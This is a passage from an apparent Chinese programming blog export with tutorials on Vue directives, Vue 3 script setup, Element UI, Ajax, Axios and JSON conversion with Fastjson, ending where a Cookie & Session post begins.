}\n        }\n    });\n</script>\n```\n\n* `el` ： 用来指定哪些标签受 Vue 管理。 \n* `data` ：用来定义数据模型\n* `methods` ：用来定义函数。这个我们在后面就会用到\n\n3、编写视图\n\n```html\n<div id=\"app\">\n    <input name=\"username\" v-model=\"username\" >\n    {{username}} <!--插值表达式-->\n    <input type=\"button\" value=\"一个按钮\" v-on:click=\"show()\"><br>\n</div>\n```\n\n- `{{}}` 是 Vue 中定义的 `插值表达式` ，模型的数据值展示在这个位置。\n- `v-model` 创建双向数据绑定\n\n###  Vue 指令\n\n**指令：**HTML 标签上带有 `v- 前缀` 的特殊属性，不同指令具有不同含义。例如：v-if，v-for…\n\n| **指令**  | **作用**                                            |\n| --------- | --------------------------------------------------- |\n| v-bind    | 为HTML标签绑定属性值，如设置  href , css样式等      |\n| v-model   | 在表单元素上创建双向数据绑定                        |\n| v-on      | 为HTML标签绑定事件                                  |\n| v-if      | 条件性的渲染某元素，判定为true时渲染,否则不渲染     |\n| v-else    |                                                     |\n| v-else-if |                                                     |\n| v-show    | 根据条件展示某元素，区别在于切换的是display属性的值 |\n| v-for     | 列表渲染，遍历容器的元素或者对象的属性              |\n\n#### v-bind\n\n该指令可以给标签原有属性绑定模型数据。\n\n```html\n<a v-bind:href=\"url\">百度一下</a>\n\n<a :href=\"url\">百度一下</a> <!--v-bind 可以省略-->\n```\n\n#### v-model\n\n该指令可以给表单项标签绑定模型数据。这样就能实现双向绑定效果。\n\n```html\n<input name=\"username\" v-model=\"username\">\n```\n\n测试\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\" xmlns:v-bind=\"http://www.w3.org/1999/xhtml\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Title</title>\n</head>\n<body>\n<div id=\"app\">\n    <a v-bind:href=\"url\">点击一下</a>\n    <a :href=\"url\">点击一下</a>\n    <input v-model=\"url\">\n</div>\n  \n<script src=\"js/vue.js\"></script>\n<script>\n    new Vue({\n        el:\"#app\",\n        data(){\n            return {\n                username:\"\",\n                url:\"https://www.baidu.com\"\n            }\n        }\n    });\n</script>\n</body>\n</html>\n```\n\n#### v-on\n\n绑定单击事件\n\n```html\n<input type=\"button\" value=\"一个按钮\" v-on:click=\"show()\">\n\n<input type=\"button\" value=\"一个按钮\" @click=\"show()\"><!--v-on:可替换成@-->\n```\n\n测试\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\" xmlns:v-on=\"http://www.w3.org/1999/xhtml\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Title</title>\n</head>\n<body>\n<div id=\"app\">\n    <input type=\"button\" value=\"一个按钮\" v-on:click=\"show()\"><br>\n    <input type=\"button\" value=\"一个按钮\" @click=\"show()\">\n</div>\n<script src=\"js/vue.js\"></script>\n<script>\n    //1. 创建Vue核心对象\n    new Vue({\n        el:\"#app\",\n        methods:{\n            show(){\n                alert(\"我被点了...\");\n            }\n        }\n    });\n</script>\n</body>\n</html>\n```\n\n#### v-if\n\n- 当 `count` 模型的数据是3时，在页面上展示 `div1` 内容；\n\n- 当 `count` 模型的数据是4时，在页面上展示 `div2` 内容；\n- `count` 模型数据是其他值时，在页面上展示 `div3`。\n- 这里为了动态改变模型数据 `count` 的值，再定义一个输入框绑定 `count` 模型数据。\n\n```html\n<div id=\"app\">\n    <div v-if=\"count == 3\">div1</div>\n    <div v-else-if=\"count == 4\">div2</div>\n    <div v-else>div3</div>\n    <hr>\n    <input v-model=\"count\">\n</div>\n\n<script>\n    new Vue({\n        el:\"#app\",\n        data(){\n            return {\n                count:3\n            }\n        }\n    });\n</script>\n```\n\n测试\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Title</title>\n</head>\n<body>\n<div id=\"app\">\n    <div v-if=\"count == 3\">div1</div>\n    <div v-else-if=\"count == 4\">div2</div>\n    <div v-else>div3</div>\n    <hr>\n    <input v-model=\"count\">\n</div>\n\n<script src=\"js/vue.js\"></script>\n<script>\n    new Vue({\n        el:\"#app\",\n        data(){\n            return {\n                count:3\n            }\n        }\n    });\n</script>\n</body>\n</html>\n```\n\n#### v-show\n\n `v-show` 和 `v-if` 效果类似，区别在于渲染方式不同\n\n`v-show` 不展示的原理是给对应的标签添加 `display` 属性，并将该属性值设置为 `none` ，这样就达到了隐藏的效果。而 `v-if` 指令是条件不满足时根本就不会渲染。\n\n```html\n<div id=\"app\">\n    <div v-show=\"count == 3\">div1</div>\n    <div v-show=\"count == 4\">div2</div>\n    <hr>\n    <input v-model=\"count\">\n</div>\n```\n\n测试\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Title</title>\n</head>\n<body>\n<div id=\"app\">\n    <div v-show=\"count == 3\">div1</div>\n    <div v-show=\"count == 4\">div2</div>\n    <hr>\n    <input v-model=\"count\">\n</div>\n\n<script src=\"js/vue.js\"></script>\n<script>\n    new Vue({\n        el:\"#app\",\n        data(){\n            return {\n                count:3\n            }\n        }\n    });\n</script>\n</body>\n</html>\n```\n\n#### v-for\n\n遍历\n\n```html\n<标签 v-for=\"变量名 in 集合模型数据\">\n    {{变量名}}\n</标签>\n```\n\n如果在页面需要使用到集合模型数据的索引，就需要使用如下格式：\n\n```html\n<标签 v-for=\"(变量名,索引变量) in 集合模型数据\">\n    <!--索引变量是从0开始，所以要表示序号的话，需要手动的加1-->\n   {{索引变量 + 1}} {{变量名}}\n</标签>\n```\n\n测试\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Title</title>\n</head>\n<body>\n<div id=\"app\">\n    <div v-for=\"addr in addrs\">\n        {{addr}} <br>\n    </div>\n\n    <hr>\n    <div v-for=\"(addr,i) in addrs\">\n        {{i+1}}--{{addr}} <br>\n    </div>\n</div>\n\n<script src=\"js/vue.js\"></script>\n<script>\n    new Vue({\n        el:\"#app\",\n        data(){\n            return {\n                addrs:[\"北京\",\"上海\",\"西安\"]\n            }\n        }\n    });\n</script>\n</body>\n</html>\n```\n\n### 生命周期\n\n官网生命周期API：[API — Vue.js (vuejs.org)](https://cn.vuejs.org/v2/api/#选项-生命周期钩子)\n\nVue 生命周期有八个阶段，每触发一个生命周期事件，会自动执行一个生命周期方法，这些生命周期方法也被称为钩子方法。\n\n| 状态          | 阶段     | 描述                                                         |\n| ------------- | -------- | ------------------------------------------------------------ |\n| beforeCreate  | 创建前   | 在实例初始化之后,进行数据侦听和事件/侦听器的配置之前同步调用 |\n| created       | 创建后   | 在实例创建完成后被立即同步调用                               |\n| beforeMount   | 载入前   | 在挂载开始之前被调用                                         |\n| mounted       | 挂载完成 | 实例被挂载后调用                                             |\n| beforeUpdate  | 更新前   | 在数据发生改变后，DOM 被更新之前被调用                       |\n| updated       | 更新后   | 在数据更改导致的虚拟 DOM 重新渲染和更新完毕之后被调用        |\n| beforeDestroy | 销毁前   | 实例销毁之前调用                                             |\n| destroyed     | 销毁后   | 实例销毁后调用                                               |\n\n![](https://img.jwt1399.top/img/image-20220507105816220.png)\n\n## vue-cli\n\n vue-cli 官方提供的一个脚手架，用于快速生成一个 vue 的项目模板。预先定义好的目录结构及基础代码，就好比咱们在创建 Maven 项目时可以选择创建一个骨架项目，这个骨架项目就是脚手架，我们的开发更加的快速。\n\n### 安装\n\n```bash\nnpm install -g @vue/cli\n\n#查看是否安装成功\nvue -V\n```\n\n### 使用\n\n```bash\n#创建一个名为myvue的vue项目\nvue create myvue\n\n#运行\ncd myvue\nnpm run serve\n```\n\n以图形化界面创建和管理项目\n\n```bash\nvue ui\n```\n\n### vue 项目的运行流程\n\n在工程化的项目中， vue 要做的事情很单纯：通过 main.js 把 App.vue 渲染到 index.html 的指定区域中。\n\n① App.vue 用来编写待渲染的模板结构\n② index.html 中需要预留一个 el 区域\n③ main.js 把 App.vue 渲染到了 index.html 所预留的区域中\n\n### src 目录的构成\n\nassets 文件夹：存放项目中用到的静态资源文件，例如：css 样式表、图片资源\ncomponents 文件夹：程序员封装的、可复用的组件，都要放到 components 目录下\nmain.js 是项目的入口文件。整个项目的运行，要先执行 main.js\nApp.vue 是项目的根组件。\n\n```bash\n├── README.md\n├── babel.config.js\n├── jsconfig.json\n├── node_modules\n├── package-lock.json\n├── package.json\n├── public\n│   ├── favicon.ico  # favicon图标\n│   └── index.html   # html模板\n├── src\n│   ├── App.vue     # 入口页面,放每个页面都有的内容\n│   ├── assets      # 主题 字体等静态资源\n│   ├── components  # 全局公用组件\n│   ├── main.js     # 入口文件 加载组件 初始化等\n│   ├── router      # 路由\n│   └── views       # 单个页面内容\n└── vue.config.js    # vue-cli 配置\n```\n\n## Vue3\n\n### script setup\n\n它是 Vue3 的一个新语法糖，在 `setup` 函数中。所有 ES 模块导出都被认为是暴露给上下文的值，并包含在 setup() 返回对象中。相对于之前的写法，使用后，语法也变得更简单。\n\n使用方式极其简单，仅需要在 `script` 标签加上 `setup` 关键字即可。示例：\n\n```javascript\n<script setup></script>\n```\n\n#### 属性和方法无需返回\n\n这可能是带来的较大便利之一，在以往的写法中，定义数据和方法，都需要在结尾 return 出去，才能在模板中使用。在 script setup 中，定义的属性和方法无需返回，可以直接使用！\n\n```html\n<!--不使用script setup-->\n<template>\n  <div>\n   \t<p>My name is {{name}}</p>\n    <p>sex is {{sex}}</p>\n  </div>\n</template>\n\n<script>\n\timport { ref } from 'vue';\n  export default {\n    name:'组件名'\n    setup(){\n      const name = ref('Tom')\n      const sex = ref('男')\n      return{\n\t\t\t\tname，\n        sex，\n      }\n    }\n\t} \n</script>\n```\n\n```html\n<!--使用script setup-->\n<template>\n  <div>\n   \t<p>My name is {{name}}</p>\n    <p>sex is {{sex}}</p>\n  </div>\n</template>\n\n<script setup>\nimport { ref } from 'vue';\nconst name = ref('Tom')\nconst sex = ref('男')\n</script>\n```\n\n#### 组件自动注册\n\n在 script setup 中，引入的组件可以直接使用，无需再通过`components`进行注册\n\n```html\n<!--不使用script setup-->\n<template>\n  <Header/>\n  <Footer/>   \n</template>\n \n<script>\nimport Header from '@/components/Header.vue'\nimport Footer from '@/components/Footer.vue'\nexport default {\n  components: {\n    Header,\n    Footer,\n  }\n} \n</script>\n```\n\n```html\n<!--使用script setup-->\n<template>\n  <Header/>\n  <Footer/>   \n</template>\n \n<script setup>\nimport Header from '@/components/Header.vue'\nimport Footer from '@/components/Footer.vue'\n</script>\n```\n\n#### 无需指定组件name\n\n无需指定当前组件的名字，它会自动以文件名为主，也就是不用再写`name`属性了。如果需要定义类似 name 的属性，可以再加个平级的 script 标签，在里面实现即可。\n\n```html\n<!--不使用script setup-->\n<template>\n<el-footer class=\"footer\"> \n    <span>我是页底</span> \n </el-footer>\n</template>\n\n\n<script>\nexport default{\n    name:'Footer',\n}\n</script>\n```\n\n```html\n<!--使用script setup-->\n<template>\n<el-footer class=\"footer\"> \n    <span>我是页底</span> \n </el-footer>\n</template>\n\n<script setup>\n</script>\n```\n\n\n\n#### 使用 props\n\n通过`defineProps`指定当前 props 类型，获得上下文的props对象。示例：\n\n```html\n<script setup>\n  import { defineProps } from 'vue'\n  const props = defineProps({\n  title: String,\n  })\n</script>\n```\n\n#### 使用 emits\n\n使用`defineEmit`定义当前组件含有的事件，并通过返回的上下文去执行 emit。示例：\n\n```html\n<script setup>\n  import { defineEmits } from 'vue'\n  const emit = defineEmits(['change', 'delete'])\n</script>\n```\n\n#### 获取 slots 和 attrs\n\n可以通过`useContext`从上下文中获取 slots 和 attrs。不过提案在正式通过后，废除了这个语法，被拆分成了`useAttrs`和`useSlots`。示例：\n\n```html\n<!--旧-->\n<script setup>\n  import { useContext } from 'vue'\n  const { slots, attrs } = useContext()\n</script>\n\n<!--新-->\n<script setup>\n  import { useAttrs, useSlots } from 'vue'\n  const attrs = useAttrs()\n  const slots = useSlots()\n</script>\n```\n\n#### 父子组件传值\n\n- 子组件获取到父组件的值用defineEmit\n- 子组件给父组件传值用defineProps\n- 子组件暴露自己的数据和方法用defineExpose\n\n##### defineEmit\n\n##### defineProps\n\n##### defineExpose\n\n传统的写法，我们可以在父组件中，通过 ref 实例的方式去访问子组件的内容，但在 script setup 中，该方法就不能用了，setup 相当于是一个闭包，除了内部的 `template`模板，谁都不能访问内部的数据和方法。如果需要对外暴露 setup 中的数据和方法，需要使用 defineExpose API。\n\n```html\n//child.vue\n<template>\n    <div>{{num}}</div>\n</template>\n\n<script setup>\n    import {ref,defineExpose} from 'vue'\n    const num = ref(123)\n    defineExpose({\n        num\n    })\n</script>\n\n\n//father.vue\n<template>\n    <div>\n        <Child ref=\"child\"></Child>\n    </div>\n</template>\n\n<script setup>\nimport {ref} from 'vue'\nimport Child from './child.vue'\nconst child = ref(null)\nsetTimeout (() => {\n    console.log(child.value.num++)\n},1000)\n</script>\n```\n\n### ref & reactive\n\nVue3 中主要用 reactive 和 ref 进行响应数据的监听。他俩的区别在于：\n\n- ①reactive中必须存放对象（json、数组等），不能存放基本数据类型\n\n- ②ref则可以存放基本数据类型【注：ref本质还是reactive】\n\n```javascript\nlet a = reactive({\n  name:'Tom',\n  sex:'man'\n});\n\nlet b = ref(5);\n```\n\n#### ref\n\n**功能**\n\n- 1.基本类型封装，使数据响应式\n- 2.模板ref，获取dom元素节点\n\n\n\n**2.ref属性获取dom元素**\n\n在`vue2.x`中，可以通过给元素添加`ref='xxx'`属性，然后在代码中通过`this.$refs.xxx`获取到对应的元素\n\n然而在`vue3`中时没有`$refs`这个东西的，因此`vue3`中通过`ref`属性获取元素就不能按照`vue2`的方式来获取\n `vue3`需要借助生命周期方法，原因很简单，在`setup`执行时，`template`中的元素还没挂载到页面上，所以必须在`mounted`之后才能获取到元素。\n\n```html\n<template>\n  <div ref='box'>I am DIV</div>\n</template>\n<script>\nimport {ref,onMounted}\nexport default{\n  setup(){\n    let box = ref(null);\n    onMounted(()=>{\n      console.log(box.value)\n    });\n    return {box}\n  }\n}\n</script>\n```\n\n如上代码，`vue3`中，所有生命周期方法都抽离出去了，需要用时直接`import`。这里导入了一个`onMounted`\n 当界面挂载出来的时候，就会自动执行`onMounted`的回调函数，里头就可以获取到dom元素\n\nvue3如何通过ref属性获取界面上的元素?\n 在 template 中的写法跟 Vue2 一样，给元素添加个 ref='xxx'， 在 setup 中，先创建一个响应式数据，并且要把响应式数据暴露出去，当元素被创建出来的时候，就会给对应的响应数据赋值，当响应式数据被赋值之后，就可以利用生命周期方法，在生命周期方法中获取对应的响应式数据，即DOM元素\n\n\n\n\n\n\n\n## Element UI\n\nElement 官网：[Vue 2 UI 框架 | Element](https://element.eleme.cn/#/zh-CN)、[Vue 3 UI 框架 | Element Plus](https://element-plus.gitee.io/zh-CN/)\n\n### 快速入门\n\n1、引入资源\n\n```html\n<!-- 引入Vue -->\n<script src=\"https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js\"></script>\n<!-- 引入样式 -->\n<link rel=\"stylesheet\" href=\"https://unpkg.com/element-ui/lib/theme-chalk/index.css\">\n<!-- 引入组件库 -->\n<script src=\"https://unpkg.com/element-ui/lib/index.js\"></script>\n```\n\n2、创建 Vue 对象\n\n```html\n<script>\n    new Vue({\n        el:\"#app\"\n    })\n</script>\n```\n\n3、使用Element组件代码\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Title</title>\n</head>\n<body>\n<div id=\"app\">\n    <!-- element代码 -->\n    <el-row>\n     \t<el-button>默认按钮</el-button>\n        <el-button type=\"primary\">主要按钮</el-button>\n        <el-button type=\"success\">成功按钮</el-button>\n        <el-button type=\"info\">信息按钮</el-button>\n        <el-button type=\"warning\">警告按钮</el-button>\n        <el-button type=\"danger\">删除</el-button>\n    </el-row>\n</div>\n\n<!-- 引入Vue -->\n<script src=\"https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js\"></script>\n<!-- 引入样式 -->\n<link rel=\"stylesheet\" href=\"https://unpkg.com/element-ui/lib/theme-chalk/index.css\">\n<!-- 引入组件库 -->\n<script src=\"https://unpkg.com/element-ui/lib/index.js\"></script>\n\n<script>\n    new Vue({\n        el:\"#app\"\n    })\n</script>\n\n</body>\n</html>\n```\n\n\n\n## Sponsor❤️\n\n您的支持是我不断前进的动力，如果您感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝</td>\n         <td style=\"text-align:center;\">微信</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["Web"],"categories":["JavaWeb"]},{"title":"Ajax & Axios & Json","url":"/posts/16553.html","content":"\n## Ajax\n\n### 简介\n\nAJAX (Asynchronous JavaScript And XML)：异步的 JavaScript 和 XML。\n\nAJAX 有两个作用：\n\n- 1、与服务器进行数据交换。可以使用 Ajax 和服务器进行通信\n\n![](https://img.jwt1399.top/img/image-20220427141958390.png)\n\n- 2、异步交互。可以在不重新加载整个页面的情况下，可以与服务器交换数据并更新部分网页内容。\n\n### 同步和异步\n\n**同步发送请求过程**\n\n![](https://img.jwt1399.top/img/image-20220427142230880.png)\n\n浏览器页面在发送请求给服务器，在服务器处理请求的过程中，浏览器页面不能做其他的操作。只能等到服务器响应结束后，浏览器页面才能继续做其他的操作。\n\n**异步发送请求过程**\n\n![](https://img.jwt1399.top/img/image-20220427142237621.png)\n\n浏览器页面发送请求给服务器，在服务器处理请求的过程中，浏览器页面还可以做其他的操作。\n\n### 快速入门\n\n#### 服务端实现\n\n```java\n@WebServlet(\"/ajaxServlet\")\npublic class AjaxServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        //响应数据\n        response.getWriter().write(\"hello Ajax~\");\n    }\n    @Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        this.doGet(request, response);\n    }\n}\n```\n\n#### 客户端实现\n\n在 webapp 下创建名为 ajax.html 的页面，在该页面书写 Ajax 代码\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Title</title>\n</head>\n<body>\n<script>\n    //1. 创建核心对象,不同的浏览器创建的对象是不同的\n    var xhttp;\n    if (window.XMLHttpRequest) {\n        xhttp = new XMLHttpRequest();\n    } else {\n        // code for IE6, IE5\n        xhttp = new ActiveXObject(\"Microsoft.XMLHTTP\");\n    }\n    //2. 发送请求\n    xhttp.open(\"GET\", \"http://localhost:8080/ajax-demo/ajaxServlet\");//建立连接\n    xhttp.send();//发送请求\n    //3. 获取响应\n    xhttp.onreadystatechange = function() {\n        if (this.readyState == 4 && this.status == 200) {\n            //处理响应结果\n            alert(this.responseText);//弹出服务端响应的数据\n        }\n    };\n</script>\n</body>\n</html>\n```\n\n运行后，在浏览器地址栏输入 `http://localhost:8080/ajax-demo/ajax.html` ，在 `ajax.html` 加载的时候就会发送 Ajax 请求，获取服务端响应的数据，“hello Ajax~”\n\n## Axios\n\nAxios 是一个基于 promise 的网络请求库。本质上是对原生的 Ajax 进行封装，简化代码\n\n### 基础语法\n\n1、引入 axios 的 js 文件\n\n```javascript\n<script src=\"js/axios.js\"></script>\n```\n\n2、使用 axios 发送请求，并获取响应结果\n\n- 发送 get 请求\n\n```javascript\naxios({\n  method:\"get\",\n  url:\"请求的URL地址?请求体\"\n  }).then(function (resp){//用来指定请求成功之后的回调函数\n  alert(resp.data);//resp 是请求成功之后的结果\n})\n```\n\n- 发送 post 请求\n\n```javascript\naxios({\n  method:\"post\",\n  url:\"请求的URL地址\",\n  data:\"请求体\"\n  }).then(function (resp){\n  alert(resp.data);\n});\n```\n\naxios() 是用来发送异步请求的，小括号中使用 js 对象传递请求相关的参数：\n\n| 参数       | 描述                   |\n| ---------- | ---------------------- |\n| method     | 请求类型               |\n| url        | 请求的URL地址          |\n| data       | post请求体             |\n| then(函数) | 请求成功之后的回调函数 |\n\n### 快速入门\n\n#### 后端实现\n\n定义一个用于接收请求的servlet\n\n```java\n@WebServlet(\"/axiosServlet\")\npublic class AxiosServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        System.out.println(\"get...\");\n        //1. 接收请求参数\n        String username = request.getParameter(\"username\");\n        System.out.println(username);\n        //2. 响应数据\n        response.getWriter().write(\"hello Axios~\");\n    }\n    @Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        System.out.println(\"post...\");\n        this.doGet(request, response);\n    }\n}\n```\n\n#### 前端实现\n\n新建 axios.html 并引入 axios.js\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\">\n  <title>Title</title>\n</head>\n<body>\n<script src=\"js/axios.js\"></script>\n<script>\n  //1. get\n  axios({\n  method:\"get\",\n  url:\"http://localhost:8080/axois-demo/axiosServlet?username=Tom\"\n  }).then(function (resp) {\n  alert(resp.data);\n  })\n  \n  //2. post\n  /*axios({\n    method:\"post\",\n    url:\"http://localhost:8080/axois-demo/axiosServlet\",\n    data:\"username=Tom\"\n  }).then(function (resp) {\n    alert(resp.data);\n  })*/\n</script>\n</body>\n</html>\n```\n\n运行后，在浏览器地址栏输入 `http://localhost:8080/axois-demo/axios.html` ，在 `axios.html` 加载的时候就会发送 Axios 请求，获取服务端响应的数据，弹出“hello Axios~”\n\n### 请求方法别名\n\n为了方便更加简化代码， Axios 为所有支持的请求方法提供了别名。\n\n- get 请求 ： axios.get(url[,config])\n- post 请求： axios.post(url[,data[,config])\n\n- delete 请求 ： axios.delete(url[,config])\n\n- head 请求 ： axios.head(url[,config])\n\n- options 请求 ： axios.option(url[,config])\n\n- put 请求： axios.put(url[,data[,config])\n\n- patch 请求： axios.patch(url[,data[,config])\n\n**get请求可改为：**\n\n```javascript\naxios.get(\"/axios-demo/axiosServlet?username=Tom\").then(function(resp) {\n    alert(resp.data);\n});\n```\n\n**post请求可改为：**\n\n```javascript\n axios.post(\"/axios-demo/axiosServlet\",\"username=Tom\").then(function(resp) {\n    alert(resp.data);\n  })\n```\n\n### Vue3使用Axios\n\nstep1. 使用npm安装axios\n\n```bash\nnpm install axios --save\n```\n\nstep2. 我们将要使用的axios实例单独编写成一个js文件，文件夹可以建立在**src/utils/**（自己选择建立在什么地方）。命名为： `axios.js`\n\n```javascript\nimport axios from 'axios'\n\n//使用axios下面的create([config])方法创建axios实例，其中config参数为axios最基本的配置信息。\nconst API = axios.create({\n\tbaseUrl:'http://localhost:8080' ,//请求后端数据的基本地址，自定义\n\theaders: {\n\t\t'Content-Type': 'application/x-www-form-urlencoded',\n\t},\n\ttimeout: 2000                   //请求超时设置，单位ms\n})\n\n//导出我们建立的axios实例模块，ES6 export用法\nexport default API\n```\n\nstep3. 然后在**main.js**中导入我们编写**axios.js**文件，全局配置一下axios的引用。\n\n```java\n//main.js\nimport { createApp } from 'vue'\nimport App from './App.vue'\nimport axios from '@/utils/axios.js'\n\nconst app = createApp(APP);   //建立一个vue3app\napp.mount('#app');            //将这个vue3app全局挂载到#app元素上\napp.config.globalProperties.$axios=axios;  //配置axios的全局引用\n```\n\n\n\n## Json\n\n### 简介\n\nJSON（JavaScript Object Notation ）：JavaScript 对象表示法\n\n作用：由于其语法格式简单，层次结构鲜明，现多用于作为数据载体，在网络中进行数据传输。\n\nJavaScript 对象格式：\n\n```javascript\n{\n  name:\"zhangsan\",\n  age:23,\n  city:\"北京\"\n}\n```\n\nXML 格式：\n\n```xml\n<student>\n  <name>张三</name>\n  <age>23</age>\n  <city>北京</city>\n</student>\n```\n\nJSON 格式：\n\n```json\n{\n  \"name\":\"zhangsan\",\n  \"age\":23,\n  \"city\":\"北京\"\n}\n```\n\n对比后就会发现 JSON 格式更简单，JSON 格式和 JS 对象格式特别像。JSON 格式中的键要求必须使用双引号括起来。\n\n### 基础语法\n\nJSON 本质就是一个字符串，但是该字符串内容是有一定的格式要求的。 定义格式如下：\n\n```javascript\nvar 变量名 = '{\"key\":value,\"1 key\":value,...}';\n```\n\nJSON 的键要求必须使用双引号括起来，而值根据要表示的类型确定。\n\nvalue 的数据类型分为如下\n\n- 数字（整数或浮点数）\n\n- 字符串（使用双引号括起来）\n\n- 逻辑值（true或者false）\n\n- 数组（在方括号中）\n\n- 对象（在花括号中）\n\n```javascript\nvar jsonStr = '{\"name\":\"Tom\",\"age\":23,\"addr\":[\"北京\",\"上海\",\"西安\"],\"user\":{\"id\":1,\"username\":\"Tom\"},\"flag\":true}'\n```\n\n### Json和JS对象相互转换\n\n如果是一个 JS 对象，我们就可以通过 `JS对象.属性名` 的方式来获取数据。\n\nJS 提供了一个对象 JSON ，该对象有如下两个方法\n\n| 方法           | 作用                   | 使用方法                               |\n| -------------- | ---------------------- | -------------------------------------- |\n| parse(str)     | 将 JSON 转换为 JS 对象 | var jsObject = JSON.parse(jsonStr);    |\n| stringify(obj) | 将 JS 对象转换为 JSON  | var jsonStr = JSON.stringify(jsObject) |\n\n```javascript\n<script>\n  //1. 定义JSON字符串\n  var jsonStr = '{\"name\":\"Tom\",\"age\":23,\"addr\":[\"北京\",\"上海\",\"西安\"]}'\n  alert(jsonStr);\n  //2. 将 JSON 字符串转为 JS 对象\n  let jsObject = JSON.parse(jsonStr);\n  alert(jsObject)\n  alert(jsObject.name)\n  //3. 将 JS 对象转换为 JSON 字符串\n  let jsonStr2 = JSON.stringify(jsObject);\n\talert(jsonStr2)\n</script>\n```\n\n### Axios发送Json数据\n\n提前定义一个 js 对象，用来封装需要提交的参数，然后使用 JSON.stringify(js对象) 转换为 JSON ，再将该 JSON 作为 axios 的 data 属性值进行请求参数的提交。\n\n```javascript\nvar jsObject = {name:\"张三\"};\naxios({\n  method:\"post\",\n  url:\"http://localhost:8080/ajax-demo/axiosServlet\",\n  data: JSON.stringify(jsObject)\n  }).then(function (resp) {\n  alert(resp.data);\n})\n```\n\n而 axios 是一个很强大的工具。只需要将需要提交的参数封装成 JS 对象，并将该 JS 对象作为 axios 的 data 属性值，它会自动将 JS 对象转换为 JSON 进行提交。\n\n```javascript\nvar jsObject = {name:\"张三\"};\naxios({\n    method:\"post\",\n    url:\"http://localhost:8080/ajax-demo/axiosServlet\",\n    data:jsObject //这里 axios 会将该js对象转换为 json \n    }).then(function (resp) {\n    alert(resp.data);\n})\n```\n\n### Json和Java对象相互转换\n\n#### Fastjson介绍\n\nFastjson 是阿里巴巴提供的一个 Java 语言编写的高性能功能完善的 JSON 库，是目前 Java 语言中最快的 JSON 库，可以实现 Java 对象和 JSON 字符串的相互转换。\n\n#### Fastjson使用\n\n1、导入依赖\n\n```xml\n<dependency>\n  <groupId>com.alibaba</groupId>\n  <artifactId>fastjson</artifactId>\n  <version>1.2.62</version>\n</dependency>\n```\n\n2、Java对象转JSON\n\n将 Java 对象转换为 JSON ，只需要使用 Fastjson 提供的 JSON 类中的 toJSONString() 静态方法即可。\n\n```java\nString jsonStr = JSON.toJSONString(obj);\n```\n\n3、JSON字符串转Java对象\n\n将 JSON 转换为 Java 对象，只需要使用 Fastjson 提供的 JSON 类中的 parseObject() 静态方法即可。\n\n```java\nUser user = JSON.parseObject(jsonStr, User.class);\n```\n\n4、测试\n\n```java\npublic class User {\n    private int id;\n    private String username;\n    private String Password;\n\n    public int getId() {\n        return id;\n    }\n\n    public void setId(int id) {\n        this.id = id;\n    }\n    public void setUsername(String username) {\n        this.username = username;\n    }\n    public void setPassword(String password) {\n        Password = password;\n    }\n\n    public String getUsername() {\n        return username;\n    }\n\n    public String getPassword() {\n        return Password;\n    }\n\n    @Override\n    public String toString() {\n        return \"User{\" +\n                \"id=\" + id +\n                \", username='\" + username + '\\'' +\n                \", Password='\" + Password + '\\'' +\n                '}';\n    }\n}\n\n```\n\n```java\npublic class FastJsonDemo {\n    public static void main(String[] args) {\n        \n        User user = new User();\n        user.setId(1);\n        user.setUsername(\"Tom\");\n        user.setPassword(\"123\");\n        System.out.println(\"初始user对象：\"+user);\n      \n        //1. 将Java对象转为JSON字符串\n        String jsonString = JSON.toJSONString(user);\n        System.out.println(\"转换成json：\"+jsonString);\n\n        //2. 将JSON字符串转为Java对象\n        User u = JSON.parseObject(jsonString, User.class);\n        System.out.println(\"再转换成user对象：\"+u);\n    }\n}\n\n/**\n初始user对象：User{id=1, username='Tom', Password='123'}\n转换成json：{\"id\":1,\"password\":\"123\",\"username\":\"Tom\"}\n再转换成user对象：User{id=1, username='Tom', Password='123'}\n**/\n```\n\n## Sponsor❤️\n\n您的支持是我不断前进的动力，如果您感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝</td>\n         <td style=\"text-align:center;\">微信</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["JS"],"categories":["JavaWeb"]},{"title":"Cookie & Session","url":"/posts/37985.html","content":"\nHTTP 协议是一种`无状态协议`，即每次服务端接收到客户端的请求时，都是一个全新的请求，服务器并不知道客户端的历史请求记录。Cookie 和 Session  的主要目的就是为了弥补 HTTP 的无状态特性。\n\n## 